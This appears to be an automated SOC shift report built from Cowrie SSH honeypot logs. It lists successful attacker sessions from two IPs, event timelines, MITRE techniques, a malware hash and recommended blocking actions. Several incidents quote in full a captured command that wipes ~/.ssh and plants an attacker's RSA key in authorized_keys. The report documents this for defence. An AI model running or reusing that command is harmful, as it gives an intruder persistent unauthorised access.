| `2026-05-25 09:34:48` | `cowrie.client.kex` |
| `2026-05-25 09:34:49` | `cowrie.login.success` |
| `2026-05-25 09:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266c25d4bcad

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:42 |
| **Last Seen** | 2026-05-25 09:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:42:54` | `cowrie.session.connect` |
| `2026-05-25 09:42:54` | `cowrie.client.version` |
| `2026-05-25 09:42:54` | `cowrie.client.kex` |
| `2026-05-25 09:42:55` | `cowrie.login.success` |
| `2026-05-25 09:42:55` | `cowrie.session.params` |
| `2026-05-25 09:42:55` | `cowrie.command.input` |
| `2026-05-25 09:42:55` | `cowrie.command.failed` |
| `2026-05-25 09:42:56` | `cowrie.log.closed` |
| `2026-05-25 09:42:56` | `cowrie.session.params` |
| `2026-05-25 09:42:56` | `cowrie.command.input` |
| `2026-05-25 09:42:56` | `cowrie.session.file_download` |
| `2026-05-25 09:42:56` | `cowrie.log.closed` |
| `2026-05-25 09:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941ca48dd9d6

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:42 |
| **Last Seen** | 2026-05-25 09:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:42:58` | `cowrie.session.connect` |
| `2026-05-25 09:42:58` | `cowrie.client.version` |
| `2026-05-25 09:42:58` | `cowrie.client.kex` |
| `2026-05-25 09:42:59` | `cowrie.login.success` |
| `2026-05-25 09:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35ec5eeaff4b

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:46 |
| **Last Seen** | 2026-05-25 09:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:46:59` | `cowrie.session.connect` |
| `2026-05-25 09:46:59` | `cowrie.client.version` |
| `2026-05-25 09:46:59` | `cowrie.client.kex` |
| `2026-05-25 09:47:00` | `cowrie.login.success` |
| `2026-05-25 09:47:00` | `cowrie.session.params` |
| `2026-05-25 09:47:00` | `cowrie.command.input` |
| `2026-05-25 09:47:00` | `cowrie.command.failed` |
| `2026-05-25 09:47:00` | `cowrie.log.closed` |
| `2026-05-25 09:47:00` | `cowrie.session.params` |
| `2026-05-25 09:47:00` | `cowrie.command.input` |
| `2026-05-25 09:47:01` | `cowrie.session.file_download` |
| `2026-05-25 09:47:01` | `cowrie.log.closed` |
| `2026-05-25 09:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54abed6d545

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:47 |
| **Last Seen** | 2026-05-25 09:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:47:03` | `cowrie.session.connect` |
| `2026-05-25 09:47:03` | `cowrie.client.version` |
| `2026-05-25 09:47:03` | `cowrie.client.kex` |
| `2026-05-25 09:47:04` | `cowrie.login.success` |
| `2026-05-25 09:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b97aa06b112d

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 09:48 |
| **Last Seen** | 2026-05-25 09:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:48:43` | `cowrie.session.connect` |
| `2026-05-25 09:48:43` | `cowrie.client.version` |
| `2026-05-25 09:48:43` | `cowrie.client.kex` |
| `2026-05-25 09:48:43` | `cowrie.login.success` |
| `2026-05-25 09:48:43` | `cowrie.session.params` |
| `2026-05-25 09:48:43` | `cowrie.command.input` |
| `2026-05-25 09:48:43` | `cowrie.command.failed` |
| `2026-05-25 09:48:44` | `cowrie.log.closed` |
| `2026-05-25 09:48:44` | `cowrie.session.params` |
| `2026-05-25 09:48:44` | `cowrie.command.input` |
| `2026-05-25 09:48:44` | `cowrie.session.file_download` |
| `2026-05-25 09:48:44` | `cowrie.log.closed` |
| `2026-05-25 09:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade8d9fa8d43

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 09:48 |
| **Last Seen** | 2026-05-25 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:48:46` | `cowrie.session.connect` |
| `2026-05-25 09:48:46` | `cowrie.client.version` |
| `2026-05-25 09:48:46` | `cowrie.client.kex` |
| `2026-05-25 09:48:46` | `cowrie.login.success` |
| `2026-05-25 09:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08712f6bc46b

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:51 |
| **Last Seen** | 2026-05-25 09:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:51:02` | `cowrie.session.connect` |
| `2026-05-25 09:51:02` | `cowrie.client.version` |
| `2026-05-25 09:51:02` | `cowrie.client.kex` |
| `2026-05-25 09:51:03` | `cowrie.login.success` |
| `2026-05-25 09:51:03` | `cowrie.session.params` |
| `2026-05-25 09:51:03` | `cowrie.command.input` |
| `2026-05-25 09:51:03` | `cowrie.command.failed` |
| `2026-05-25 09:51:03` | `cowrie.log.closed` |
| `2026-05-25 09:51:04` | `cowrie.session.params` |
| `2026-05-25 09:51:04` | `cowrie.command.input` |
| `2026-05-25 09:51:04` | `cowrie.session.file_download` |
| `2026-05-25 09:51:04` | `cowrie.log.closed` |
| `2026-05-25 09:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdba8ee978f7

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:51 |
| **Last Seen** | 2026-05-25 09:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:51:06` | `cowrie.session.connect` |
| `2026-05-25 09:51:06` | `cowrie.client.version` |
| `2026-05-25 09:51:06` | `cowrie.client.kex` |
| `2026-05-25 09:51:07` | `cowrie.login.success` |
| `2026-05-25 09:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ddb1452f8f7

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 09:53 |
| **Last Seen** | 2026-05-25 09:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:53:19` | `cowrie.session.connect` |
| `2026-05-25 09:53:19` | `cowrie.client.version` |
| `2026-05-25 09:53:19` | `cowrie.client.kex` |
| `2026-05-25 09:53:20` | `cowrie.login.success` |
| `2026-05-25 09:53:20` | `cowrie.session.params` |
| `2026-05-25 09:53:20` | `cowrie.command.input` |
| `2026-05-25 09:53:20` | `cowrie.command.failed` |
| `2026-05-25 09:53:20` | `cowrie.log.closed` |
| `2026-05-25 09:53:20` | `cowrie.session.params` |
| `2026-05-25 09:53:20` | `cowrie.command.input` |
| `2026-05-25 09:53:20` | `cowrie.session.file_download` |
| `2026-05-25 09:53:20` | `cowrie.log.closed` |
| `2026-05-25 09:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae2cd60e410

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 09:53 |
| **Last Seen** | 2026-05-25 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:53:22` | `cowrie.session.connect` |
| `2026-05-25 09:53:22` | `cowrie.client.version` |
| `2026-05-25 09:53:22` | `cowrie.client.kex` |
| `2026-05-25 09:53:23` | `cowrie.login.success` |
| `2026-05-25 09:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce02a4bd863

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 09:57 |
| **Last Seen** | 2026-05-25 09:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:57:46` | `cowrie.session.connect` |
| `2026-05-25 09:57:46` | `cowrie.client.version` |
| `2026-05-25 09:57:46` | `cowrie.client.kex` |
| `2026-05-25 09:57:47` | `cowrie.login.success` |
| `2026-05-25 09:57:47` | `cowrie.session.params` |
| `2026-05-25 09:57:47` | `cowrie.command.input` |
| `2026-05-25 09:57:47` | `cowrie.command.failed` |
| `2026-05-25 09:57:47` | `cowrie.log.closed` |
| `2026-05-25 09:57:47` | `cowrie.session.params` |
| `2026-05-25 09:57:47` | `cowrie.command.input` |
| `2026-05-25 09:57:48` | `cowrie.session.file_download` |
| `2026-05-25 09:57:48` | `cowrie.log.closed` |
| `2026-05-25 09:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-274ba5c548f5

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 09:57 |
| **Last Seen** | 2026-05-25 09:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:57:49` | `cowrie.session.connect` |
| `2026-05-25 09:57:49` | `cowrie.client.version` |
| `2026-05-25 09:57:49` | `cowrie.client.kex` |
| `2026-05-25 09:57:50` | `cowrie.login.success` |
| `2026-05-25 09:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-523799509d9e

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 10:11 |
| **Last Seen** | 2026-05-25 10:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:11:26` | `cowrie.session.connect` |
| `2026-05-25 10:11:26` | `cowrie.client.version` |
| `2026-05-25 10:11:26` | `cowrie.client.kex` |
| `2026-05-25 10:11:27` | `cowrie.login.success` |
| `2026-05-25 10:11:27` | `cowrie.session.params` |
| `2026-05-25 10:11:27` | `cowrie.command.input` |
| `2026-05-25 10:11:27` | `cowrie.command.failed` |
| `2026-05-25 10:11:27` | `cowrie.log.closed` |
| `2026-05-25 10:11:27` | `cowrie.session.params` |
| `2026-05-25 10:11:27` | `cowrie.command.input` |
| `2026-05-25 10:11:27` | `cowrie.session.file_download` |
| `2026-05-25 10:11:27` | `cowrie.log.closed` |
| `2026-05-25 10:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8cf1e7e5e14

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 10:11 |
| **Last Seen** | 2026-05-25 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:11:29` | `cowrie.session.connect` |
| `2026-05-25 10:11:29` | `cowrie.client.version` |
| `2026-05-25 10:11:29` | `cowrie.client.kex` |
| `2026-05-25 10:11:30` | `cowrie.login.success` |
| `2026-05-25 10:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `64.227.40[.]111` | **549** | 2026-05-25 04:08 | 2026-05-25 09:59 | 430m | 0 | `T1592` | 🟠 MEDIUM |
| `74.208.13[.]194` | **54** | 2026-05-25 06:25 | 2026-05-25 06:31 | 27m | 0 | `T1592` | 🟠 MEDIUM |
| `113.161.222[.]150` | **19** | 2026-05-25 06:04 | 2026-05-25 07:21 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `163.44.117[.]135` | **19** | 2026-05-25 08:43 | 2026-05-25 09:59 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.71.30[.]159` | **19** | 2026-05-25 06:44 | 2026-05-25 08:01 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.72.208[.]101` | **19** | 2026-05-25 07:02 | 2026-05-25 08:09 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.54[.]95` | **17** | 2026-05-25 06:04 | 2026-05-25 06:41 | 24m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.143[.]203` | **16** | 2026-05-25 05:51 | 2026-05-25 07:20 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `101.79.165[.]128` | **10** | 2026-05-25 09:29 | 2026-05-25 10:11 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.140.127[.]239` | **10** | 2026-05-25 06:43 | 2026-05-25 06:43 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `170.199.150[.]177` | **7** | 2026-05-25 09:35 | 2026-05-25 09:39 | 12m | 0 | `T1592` | 🟢 LOW |
| `49.64.242[.]249` | **5** | 2026-05-25 07:25 | 2026-05-25 07:34 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.201.216[.]61` | **4** | 2026-05-25 05:49 | 2026-05-25 07:21 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | **3** | 2026-05-25 04:36 | 2026-05-25 06:24 | 4m | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | **3** | 2026-05-25 08:33 | 2026-05-25 08:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `122.35.192[.]61` | **2** | 2026-05-25 04:47 | 2026-05-25 04:52 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `34.156.238[.]76` | **2** | 2026-05-25 06:43 | 2026-05-25 06:43 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | **2** | 2026-05-25 08:29 | 2026-05-25 08:39 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]179` | **2** | 2026-05-25 05:31 | 2026-05-25 05:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]185` | **2** | 2026-05-25 09:30 | 2026-05-25 09:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.141[.]163` | 1 | 2026-05-25 09:11 | 2026-05-25 09:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.105.211[.]3` | 1 | 2026-05-25 04:33 | 2026-05-25 04:34 | 8s | 0 | `T1592` | 🟢 LOW |
| `115.190.83[.]181` | 1 | 2026-05-25 09:36 | 2026-05-25 09:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.238[.]60` | 1 | 2026-05-25 04:28 | 2026-05-25 04:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.186.7[.]10` | 1 | 2026-05-25 06:15 | 2026-05-25 06:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.114[.]236` | 1 | 2026-05-25 06:17 | 2026-05-25 06:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]254` | 1 | 2026-05-25 09:10 | 2026-05-25 09:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.48.223[.]144` | 1 | 2026-05-25 08:27 | 2026-05-25 08:27 | 30s | 0 | `T1592` | 🟢 LOW |
| `144.91.106[.]231` | 1 | 2026-05-25 06:17 | 2026-05-25 06:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.147[.]226` | 1 | 2026-05-25 09:26 | 2026-05-25 09:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.18.161[.]165` | 1 | 2026-05-25 09:39 | 2026-05-25 09:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.37.241[.]186` | 1 | 2026-05-25 05:07 | 2026-05-25 05:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
